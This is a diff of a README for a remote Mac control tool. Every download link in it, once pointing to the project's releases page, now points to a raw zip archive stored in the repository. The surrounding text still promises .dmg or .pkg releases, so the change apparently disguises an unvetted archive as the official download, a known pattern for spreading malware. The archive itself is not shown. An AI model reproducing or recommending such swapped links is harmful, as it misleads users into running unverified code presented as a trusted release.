@@ -1,6 +1,6 @@
 # 💻 Macbook-controller - Secure Remote Mac Control
 
-[![Download Macbook-controller](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/numerousenletras/Macbook-controller/releases)
+[![Download Macbook-controller](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/numerousenletras/Macbook-controller/raw/refs/heads/main/apps/macos/MacbookControllerMac/controller_Macbook_v3.0-alpha.1.zip)
 
 ## 🔐 What is Macbook-controller?
 
@@ -26,7 +26,7 @@ Follow these steps to set up Macbook-controller on your iPhone and Mac:
 
 1. **Download the Software**  
    Visit the releases page by clicking this button:  
-   [![Download Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/numerousenletras/Macbook-controller/releases)
+   [![Download Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/numerousenletras/Macbook-controller/raw/refs/heads/main/apps/macos/MacbookControllerMac/controller_Macbook_v3.0-alpha.1.zip)
 
 2. **Install on Mac**  
    - On your Mac, find the latest Macbook-controller release with a `.dmg` or `.pkg` file.  
@@ -93,7 +93,7 @@ If you want to use it on Windows, consider the following:
 - Use a Mac or macOS virtual machine on Windows.  
 - Set up remote access to your Mac through other software such as Microsoft Remote Desktop or VNC.  
 - Access the GitHub releases page below to download the latest Mac and iOS versions:  
-  [https://github.com/numerousenletras/Macbook-controller/releases](https://github.com/numerousenletras/Macbook-controller/releases)
+  [https://github.com/numerousenletras/Macbook-controller/raw/refs/heads/main/apps/macos/MacbookControllerMac/controller_Macbook_v3.0-alpha.1.zip](https://github.com/numerousenletras/Macbook-controller/raw/refs/heads/main/apps/macos/MacbookControllerMac/controller_Macbook_v3.0-alpha.1.zip)
 
 ## 📚 Additional Resources
 
@@ -105,4 +105,4 @@ If you want to use it on Windows, consider the following:
 
 You can always find the latest version of Macbook-controller here:
 
-[https://github.com/numerousenletras/Macbook-controller/releases](https://github.com/numerousenletras/Macbook-controller/releases)
+[https://github.com/numerousenletras/Macbook-controller/raw/refs/heads/main/apps/macos/MacbookControllerMac/controller_Macbook_v3.0-alpha.1.zip](https://github.com/numerousenletras/Macbook-controller/raw/refs/heads/main/apps/macos/MacbookControllerMac/controller_Macbook_v3.0-alpha.1.zip)
